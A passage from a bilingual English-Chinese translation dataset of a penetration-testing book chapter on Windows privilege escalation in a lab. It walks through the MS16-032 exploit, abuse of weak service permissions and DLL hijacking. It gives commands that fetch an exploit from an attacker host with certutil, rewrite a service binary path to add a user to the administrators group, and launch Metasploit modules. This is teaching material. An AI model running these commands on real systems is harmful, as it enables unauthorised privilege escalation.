- en: 'As illustrated in the following screenshot, we have successfully elevated our
    privileges and should have a Meterpreter session with administrative privileges:'
  id: totrans-123
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，我们已经成功提升了权限，并应当拥有一个具有管理员权限的 Meterpreter 会话：
- en: '![Figure 8.12 – Secondary logon handle Meterpreter privileges'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.12 – 次级登录句柄 Meterpreter 权限'
- en: '](Images/B17389_08_012.jpg)'
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_012.jpg)'
- en: Figure 8.12 – Secondary logon handle Meterpreter privileges
  id: totrans-126
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.12 – 次级登录句柄 Meterpreter 权限
- en: 'Alternatively, if you do not have access to the target through a Meterpreter
    session, you can compile the exploit and transfer it to the target. The pre-built
    exploit binaries for this vulnerability can be found here: [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032).'
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 另外，如果你无法通过 Meterpreter 会话访问目标系统，你可以编译利用程序并将其传输到目标系统。该漏洞的预构建利用程序二进制文件可以在这里找到：[https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032)。
- en: 'As highlighted in the following screenshot, the GitHub repository contains
    a PowerShell script and pre-built binaries for both x64- and x86-based systems:'
  id: totrans-128
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，GitHub 仓库包含了一个 PowerShell 脚本和适用于 x64 和 x86 系统的预构建二进制文件：
- en: '![Figure 8.13 – MS16_032 GitHub repository'
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.13 – MS16_032 GitHub 仓库'
- en: '](Images/B17389_08_013.jpg)'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_013.jpg)'
- en: Figure 8.13 – MS16_032 GitHub repository
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.13 – MS16_032 GitHub 仓库
- en: 'It is, however, recommended to analyze and compile the exploit code yourself.
    The source code for the exploit can be found here: [https://github.com/khr0x40sh/ms16-032](https://github.com/khr0x40sh/ms16-032).'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，建议您自己分析并编译利用代码。该漏洞的源代码可以在这里找到：[https://github.com/khr0x40sh/ms16-032](https://github.com/khr0x40sh/ms16-032)。
- en: 'After downloading or compiling the binary, we need to transfer it to the target
    system. This can be done by following the procedure outlined here:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 下载或编译二进制文件后，我们需要将其传输到目标系统。这可以通过以下过程来实现：
- en: 'To set up a web server on our Kali virtual machine, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **ms16-032.exe** binary is stored:'
  id: totrans-134
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要在我们的Kali虚拟机上设置一个Web服务器，我们可以使用**SimpleHTTPServer** Python模块来提供二进制文件。可以通过在存储**ms16-032.exe**二进制文件的目录中运行以下命令来实现：
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python -m SimpleHTTPServer 80**'
- en: 'Alternatively, you can also utilize the Python 3 **http.server** module by
    running the following command:'
  id: totrans-136
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 或者，您也可以通过运行以下命令使用Python 3的**http.server**模块：
- en: '**sudo python3 -m http.server 80**'
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo python3 -m http.server 80**'
- en: 'We can now use the **certutil** utility to download the binary from the Kali
    virtual machine to our target system. This can be done by running the following
    command on the target system:'
  id: totrans-138
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以使用**certutil**工具将二进制文件从Kali虚拟机下载到目标系统。可以通过在目标系统上运行以下命令来实现：
- en: '**certutil -urlcache -f http://<KALI-VM-IP>/ms16-032.exe ms16-032.exe**'
  id: totrans-139
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**certutil -urlcache -f http://<KALI-VM-IP>/ms16-032.exe ms16-032.exe**'
- en: 'We can now execute the **ms16-032.exe** binary. This can be done by running
    the following command:'
  id: totrans-140
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们可以执行**ms16-032.exe**二进制文件。可以通过运行以下命令来实现：
- en: '**.\ms-16-032.exe**'
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**.\ms-16-032.exe**'
- en: 'If the binary runs successfully, you should receive output similar to the output
    highlighted in the following screenshot:'
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果二进制文件成功运行，您应该会收到类似于以下截图中突出显示的输出：
- en: '![Figure 8.14 – MS16-032 manual exploitation'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.14 – MS16-032 手动利用'
- en: '](Images/B17389_08_014.jpg)'
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_014.jpg)'
- en: Figure 8.14 – MS16-032 manual exploitation
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.14 – MS16-032 手动利用
- en: We have been able to successfully elevate our privileges by exploiting the secondary
    logon service both manually and automatically.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经成功地通过手动和自动方式利用次级登录服务提升了权限。
- en: We can now take a look at how to identify and exploit weak service permissions
    to elevate our privileges.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们来看看如何识别和利用弱服务权限来提升我们的权限。
- en: Exploiting weak service permissions
  id: totrans-148
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用弱服务权限
- en: This exploit involves leveraging improperly configured service permissions in
    order to elevate our privileges. The objective of this process is to identify
    services that run with **SYSTEM** or administrative privileges and use the improper
    permission configurations for the service to execute arbitrary commands through
    the **BINARY_PATH_NAME** parameter.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 此利用涉及利用配置不当的服务权限来提升我们的权限。此过程的目标是识别以**SYSTEM**或管理员权限运行的服务，并利用该服务的错误权限配置，通过**BINARY_PATH_NAME**参数执行任意命令。
- en: We can exploit this vulnerability to add a standard user to the local administrators
    group and consequently achieve an elevated state on the system.
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以利用这个漏洞将标准用户添加到本地管理员组，从而在系统上提升权限。
- en: 'The exploitation process can be performed by following these steps:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 利用过程可以按照以下步骤进行：
- en: 'The first step in the process involves identifying services and applications
    that standard users have access to. This can be facilitated through the use of
    the **accesschk** utility that is found in the **Sysinternals** suite. The **accesschk**
    executable can be downloaded from here: [https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk).'
  id: totrans-152
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该过程的第一步是识别标准用户可以访问的服务和应用程序。可以通过使用**accesschk**工具来简化此过程，该工具位于**Sysinternals**套件中。**accesschk**可执行文件可以从这里下载：[https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)。
- en: 'After downloading the **accesschk** executable to our Kali virtual machine,
    we will need to transfer it to the target system. This can be done through Meterpreter
    by running the following command:'
  id: totrans-153
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将**accesschk**可执行文件下载到我们的Kali虚拟机后，我们需要将其传输到目标系统。这可以通过Meterpreter运行以下命令来实现：
- en: '**upload /<PATH-TO-EXECUTABLE/accesschk64.exe**'
  id: totrans-154
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**upload /<PATH-TO-EXECUTABLE/accesschk64.exe**'
- en: In the event that you are using a standard command shell, you can use the **certutil**
    utility to transfer the binary to the target system.
  id: totrans-155
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果你正在使用标准命令行，可以使用**certutil**工具将二进制文件传输到目标系统。
- en: 'After uploading the **accesschk.exe** binary to the target system, we can enumerate
    a list of services that standard users have access to by running the following
    command:'
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在将**accesschk.exe**二进制文件上传到目标系统后，我们可以通过运行以下命令列举标准用户可以访问的服务列表：
- en: '**.\accesschk64.exe -uwcqv "vagrant" * -accepteula**'
  id: totrans-157
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**.\accesschk64.exe -uwcqv "vagrant" * -accepteula**'
- en: 'In our case, we will use the standard **vagrant** user. As highlighted in the
    following screenshot, the command should output a list of services that have **SERVICE_ALL_ACCESS**
    permissions:'
  id: totrans-158
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在我们的案例中，我们将使用标准的**vagrant**用户。如以下截图所示，命令应该输出具有**SERVICE_ALL_ACCESS**权限的服务列表：
- en: Note
  id: totrans-159
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 注意
- en: The **SERVICE_ALL_ACCESS** permission allows any user on the system to take
    control of and modify the parameters of the service.
  id: totrans-160
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**SERVICE_ALL_ACCESS**权限允许系统上的任何用户控制并修改服务的参数。'
- en: '![Figure 8.15 – accesschk results](Images/B17389_08_015.jpg)'
  id: totrans-161
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 8.15 – accesschk 结果](Images/B17389_08_015.jpg)'
- en: Figure 8.15 – accesschk results
  id: totrans-162
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.15 – accesschk 结果
- en: We are able to identify a plethora of services with **SERVICE_ALL_ACCESS** permissions.
    In our case, we will be targeting the OpenSSH service primarily because we were
    able to identify that it runs with **SYSTEM** or administrative privileges.
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们能够识别出具有**SERVICE_ALL_ACCESS**权限的大量服务。在我们的案例中，我们将主要针对OpenSSH服务，因为我们已经确认它以**SYSTEM**或管理员权限运行。
- en: 'The next step involves enumerating additional information regarding the service
    and its respective parameters. This can be done by running the following command
    in the Windows command shell:'
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是列举与服务及其相应参数相关的其他信息。这可以通过在Windows命令行中运行以下命令来完成：
- en: '**sc qc OpenSSHd**'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc qc OpenSSHd**'
- en: 'As highlighted in the following screenshot, the command will output information
    about the service and its parameters:'
  id: totrans-166
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，命令将输出有关服务及其参数的信息：
- en: '![Figure 8.16 – Service parameters'
  id: totrans-167
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.16 – 服务参数](Images/B17389_08_016.jpg)'
- en: '](Images/B17389_08_016.jpg)'
  id: totrans-168
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_016.jpg)'
- en: Figure 8.16 – Service parameters
  id: totrans-169
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.16 – 服务参数
- en: 'We can modify **BINARY_PATH_NAME** to execute arbitrary commands. In our case,
    we will be adding the **vagrant** user to the local administrators group. This
    can be done by running the following command:'
  id: totrans-170
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以修改**BINARY_PATH_NAME**以执行任意命令。在我们的案例中，我们将把**vagrant**用户添加到本地管理员组。这可以通过运行以下命令来实现：
- en: '**sc config "OpenSSHd" binPath= "net localgroup administrators vagrant /add"**'
  id: totrans-171
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc config "OpenSSHd" binPath= "net localgroup administrators vagrant /add"**'
- en: 'As highlighted in the following screenshot, if the operation runs successfully,
    the **vagrant** user account will be added to the local administrators group and
    should have administrative privileges:'
  id: totrans-172
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，如果操作成功执行，**vagrant**用户账户将被添加到本地管理员组，并应具备管理员权限：
- en: '![Figure 8.17 – Modifying the binary path'
  id: totrans-173
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.17 – 修改二进制路径](Images/B17389_08_017.jpg)'
- en: '](Images/B17389_08_017.jpg)'
  id: totrans-174
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_017.jpg)'
- en: Figure 8.17 – Modifying the binary path
  id: totrans-175
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.17 – 修改二进制路径
- en: 'After modifying the binary path parameter, we need to restart the OpenSSH service.
    This can be done by running the following commands in the Windows command shell:'
  id: totrans-176
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在修改二进制路径参数后，我们需要重新启动OpenSSH服务。这可以通过在Windows命令行中运行以下命令来完成：
- en: '**sc stop OpenSSHd**'
  id: totrans-177
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc stop OpenSSHd**'
- en: '**sc start OpenSSHd**'
  id: totrans-178
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc start OpenSSHd**'
- en: 'We can verify that the **vagrant** user account has been added to the local
    administrators group by running the following command in the Windows command shell:'
  id: totrans-179
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过在Windows命令行中运行以下命令来验证**vagrant**用户账户是否已添加到本地管理员组：
- en: '**net localgroup administrators**'
  id: totrans-180
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**net localgroup administrators**'
- en: 'As highlighted in the following screenshot, the **vagrant** user account is
    now a member of the local administrators group and has administrative privileges:'
  id: totrans-181
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，**vagrant**用户账户现在是本地管理员组的成员，并且具有管理员权限：
- en: '![Figure 8.18 – Local administrator''s group members'
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.18 – 本地管理员组成员](Images/B17389_08_018.jpg)'
- en: '](Images/B17389_08_018.jpg)'
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_018.jpg)'
- en: Figure 8.18 – Local administrator's group members
  id: totrans-184
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.18 – 本地管理员组成员
- en: 'This process can also be automated through the use of a Metasploit module named
    **exploit/windows/local/service_permissions**. We can load the module by running
    the following command in the Metasploit console:'
  id: totrans-185
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这个过程也可以通过使用一个名为**exploit/windows/local/service_permissions**的Metasploit模块来自动化。我们可以通过在Metasploit控制台中运行以下命令来加载该模块：
- en: '**use exploit/windows/local/service_permissions**'
  id: totrans-186
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**use exploit/windows/local/service_permissions**'
- en: 'After loading the module, we need to configure the module options. In this
    case, we need to set the default payload, **LHOST**, **LPORT**, and the session
    ID option, as highlighted in the following screenshot:'
  id: totrans-187
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 加载模块后，我们需要配置模块选项。在本例中，我们需要设置默认的 payload、**LHOST**、**LPORT** 和会话 ID 选项，如以下截图所示：
- en: '![Figure 8.19 – Service permissions module options'
  id: totrans-188
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.19 – 服务权限模块选项'
- en: '](Images/B17389_08_019.jpg)'
  id: totrans-189
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_019.jpg)'
- en: Figure 8.19 – Service permissions module options
  id: totrans-190
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.19 – 服务权限模块选项
- en: 'After configuring the module options, we can launch the module by running the
    following command in the Metasploit console:'
  id: totrans-191
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置模块选项后，我们可以通过在 Metasploit 控制台中运行以下命令来启动模块：
- en: '**run**'
  id: totrans-192
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**run**'
- en: 'As highlighted in the following screenshot, if the module runs successfully,
    we should receive a Meterpreter session with elevated privileges:'
  id: totrans-193
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，如果模块运行成功，我们应该会收到一个具有提升权限的 Meterpreter 会话：
- en: '![Figure 8.20 – Service permissions module Meterpreter session'
  id: totrans-194
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.20 – 服务权限模块 Meterpreter 会话'
- en: '](Images/B17389_08_020.jpg)'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_020.jpg)'
- en: Figure 8.20 – Service permissions module Meterpreter session
  id: totrans-196
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.20 – 服务权限模块 Meterpreter 会话
- en: 'We can verify that we have an elevated Meterpreter session by running the following
    command:'
  id: totrans-197
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令来验证我们是否拥有提升权限的 Meterpreter 会话：
- en: '**getuid**'
  id: totrans-198
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'As illustrated in the following screenshot, we have successfully elevated our
    privileges and should have a Meterpreter session with administrative privileges:'
  id: totrans-199
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，我们已经成功提升了权限，并且应该拥有一个具有管理员权限的 Meterpreter 会话：
- en: '![Figure 8.21 – Service permissions Meterpreter privileges'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.21 – 服务权限 Meterpreter 权限'
- en: '](Images/B17389_08_021.jpg)'
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_021.jpg)'
- en: Figure 8.21 – Service permissions Meterpreter privileges
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.21 – 服务权限 Meterpreter 权限
- en: We have been able to successfully elevate our privileges by exploiting weak
    service permissions both manually and automatically.
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经能够通过手动和自动方式成功提升权限，利用了弱服务权限。
- en: We can now take a look at the process of DLL hijacking and how it can be leveraged
    to elevate our privileges.
  id: totrans-204
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以来看一下 DLL 劫持的过程以及如何利用它来提升我们的权限。
- en: DLL hijacking
  id: totrans-205
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: DLL 劫持
- en: Windows **DLLs** are libraries that are used or called when applications or
    services are started. If the application or service cannot locate the required
    DLLs, we can force the application or service to load our own DLL that will run
    arbitrary commands in order to elevate our privileges.
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: Windows **DLLs** 是在应用程序或服务启动时使用或调用的库。如果应用程序或服务无法找到所需的 DLL，我们可以强制应用程序或服务加载我们自己的
    DLL，该 DLL 将运行任意命令以提升我们的权限。
- en: For this to work, we must first locate an application that runs with **SYSTEM**
    privileges and must have the appropriate path permissions that can allow us to
    upload our custom DLL.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 为了使此过程有效，我们必须首先找到一个以 **SYSTEM** 权限运行的应用程序，并且该应用程序必须具有允许我们上传自定义 DLL 的适当路径权限。
- en: 'Applications can load DLLs from various paths on Windows and will typically
    follow this order:'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 应用程序可以从 Windows 上的不同路径加载 DLL，通常会遵循以下顺序：
- en: Application path or directory
  id: totrans-209
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 应用程序路径或目录
- en: '**C:\Windows\System32**'
  id: totrans-210
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**C:\Windows\System32**'
- en: '**C:\Windows\System**'
  id: totrans-211
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**C:\Windows\System**'
- en: '**C:\Windows**'
  id: totrans-212
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**C:\Windows**'
- en: '**C:\Program Files**'
  id: totrans-213
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**C:\Program Files**'
- en: The **PATH** environment variable
  id: totrans-214
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: '**PATH** 环境变量'
- en: 'We can also perform DLL hijacking on application or service DLLs that do not
    have a defined path. The following code snippet is an example of an absolute path:'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以在没有定义路径的应用程序或服务的 DLL 上执行 DLL 劫持。以下代码片段是一个绝对路径的示例：
- en: PATH = C:\Windows\System32\example.dll
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: PATH = C:\Windows\System32\example.dll
- en: 'As you can see in the preceding code snippet, the path to the DLL is specified
    and as a result, the application or service knows exactly where to locate it.
    The following code snippet is an example of an undefined application or service
    DLL path that can be exploited:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的代码片段所示，DLL 的路径已被指定，因此应用程序或服务知道准确的 DLL 位置。以下代码片段是一个没有定义路径的应用程序或服务 DLL 路径的示例，这可以被利用：
- en: PATH = example.dll
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: PATH = example.dll
- en: In order to understand how this works, let's take a look at a scenario that
    will explain and demonstrate the process in greater depth.
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 为了理解这个过程，让我们看一个场景，详细解释并演示整个过程。
- en: Setting up our environment
  id: totrans-220
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 设置我们的环境
- en: In this section, we will be utilizing the Windows 7 SP1 virtual machine that
    we set up in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030), *Setting
    Up Our Lab*, of this book. We will also be setting up a vulnerable service that
    will be used to demonstrate the DLL hijacking process.
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将使用在本书[*第 2 章*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030)《设置我们的实验室》中设置的
    Windows 7 SP1 虚拟机。我们还将设置一个易受攻击的服务，用于演示 DLL 劫持过程。
- en: 'To begin setting up your environment, follow this procedure:'
  id: totrans-222
  prefs: []
  type: TYPE_NORMAL
  zh: 要开始设置环境，请按照以下步骤操作：
- en: 'The first step in the process will involve downloading and running a Windows
    batch script on the Windows 7 virtual machine. The script can be downloaded from
    this link: [https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat](https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat).'
  id: totrans-223
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该过程的第一步是下载并运行一个 Windows 批处理脚本，在 Windows 7 虚拟机上执行。脚本可以从以下链接下载：[https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat](https://raw.githubusercontent.com/sagishahar/lpeworkshop/master/lpe_windows_setup.bat)。
- en: This script will be responsible for setting up the various vulnerable services
    that will be used in the demonstrations in this chapter.
  id: totrans-224
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这个脚本将负责设置将在本章演示中使用的各种易受攻击服务。
- en: After downloading the batch script, you will need to execute it with administrative
    privileges as highlighted in the following screenshot:![Figure 8.22 – Setup script
    execution options
  id: totrans-225
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载批处理脚本后，您需要以管理员权限执行它，具体操作请参见以下截图：![图 8.22 – 设置脚本执行选项
- en: '](Images/B17389_08_022.jpg)'
  id: totrans-226
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_022.jpg)'
- en: Figure 8.22 – Setup script execution options
  id: totrans-227
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.22 – 设置脚本执行选项
- en: After the script has been executed, it will begin setting up the various vulnerable
    services that we will be using in this section. After the setup process is completed,
    you will be prompted to restart the system as illustrated in the following screenshot:![Figure
    8.23 – Setup script complete
  id: totrans-228
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 执行脚本后，它将开始设置我们将在本节中使用的各种易受攻击的服务。设置过程完成后，系统将提示您重新启动，如下图所示：![图 8.23 – 设置脚本完成
- en: '](Images/B17389_08_023.jpg)'
  id: totrans-229
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_023.jpg)'
- en: Figure 8.23 – Setup script complete
  id: totrans-230
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.23 – 设置脚本完成
- en: 'After restarting the system, we will need to start the vulnerable DLL service.
    This can be done by running the following command in the Windows command prompt
    on the target virtual machine:'
  id: totrans-231
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 系统重启后，我们需要启动易受攻击的 DLL 服务。可以通过在目标虚拟机的 Windows 命令提示符下运行以下命令来完成：
- en: '**sc start dllsvc**'
  id: totrans-232
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc start dllsvc**'
- en: 'As illustrated in the following screenshot, if the initial setup process was
    run successfully, the service should be executed without any issues:'
  id: totrans-233
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，如果初始设置过程顺利执行，服务应能无误地启动：
- en: '![Figure 8.24 – Starting the vulnerable DLL service](Images/B17389_08_024.jpg)'
  id: totrans-234
  prefs: []
  type: TYPE_IMG
  zh: '![图 8.24 – 启动易受攻击的 DLL 服务](Images/B17389_08_024.jpg)'
- en: Figure 8.24 – Starting the vulnerable DLL service
  id: totrans-235
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.24 – 启动易受攻击的 DLL 服务
- en: After starting the **dllsrv** service, our vulnerable services should be up
    and running and we should be able to move on to the exploitation phase.
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 启动**dllsrv**服务后，我们的易受攻击服务应已启动并运行，我们可以进入利用阶段。
- en: The DLL exploitation process
  id: totrans-237
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: DLL 利用过程
- en: Now that we have our target system configured with the various vulnerable services,
    we can begin the DLL hijacking process.
  id: totrans-238
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经将目标系统配置为具有各种易受攻击的服务，可以开始 DLL 劫持过程。
- en: 'Before we commence with the demonstrations, ensure that you have established
    an initial foothold on the target system:'
  id: totrans-239
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始演示之前，请确保您已经在目标系统上建立了初步的立足点：
- en: The first step in the exploitation phase involves identifying the application
    or services with missing DLLs. This can be done through the **winPEAS** enumeration
    tool that we used in [*Chapter 4*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058),
    *Performing Local Enumeration*, of this book.
  id: totrans-240
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 利用阶段的第一步是识别缺少 DLL 的应用程序或服务。可以通过我们在本书[*第 4 章*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058)《执行本地枚举》中使用的**winPEAS**枚举工具来完成此操作。
- en: 'The winPEAS binary can be downloaded from the GitHub repository here: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe).'
  id: totrans-241
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: winPEAS 二进制文件可以从 GitHub 仓库下载，链接如下：[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)。
- en: 'Ensure you download the correct binary based on the architecture of your target
    operating system; the architecture-specific binaries can be found in the **binaries**
    folder, as highlighted in the following screenshot:'
  id: totrans-242
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 确保根据目标操作系统的架构下载正确的二进制文件；架构特定的二进制文件可以在 **binaries** 文件夹中找到，如以下截图所示：
- en: '![Figure 8.25 – winPEAS binaries](Images/B17389_08_025.jpg)'
  id: totrans-243
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 8.25 – winPEAS 二进制文件](Images/B17389_08_025.jpg)'
- en: Figure 8.25 – winPEAS binaries
  id: totrans-244
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.25 – winPEAS 二进制文件
- en: After downloading the binary to our Kali virtual machine, we need to transfer
    the **winPEAS.exe** binary to our target virtual machine.
  id: totrans-245
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载二进制文件到我们的 Kali 虚拟机后，我们需要将 **winPEAS.exe** 二进制文件传输到目标虚拟机。
- en: 'We can transfer the **winPEAS.exe** binary to the target system with Meterpreter
    by running the following command:'
  id: totrans-246
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
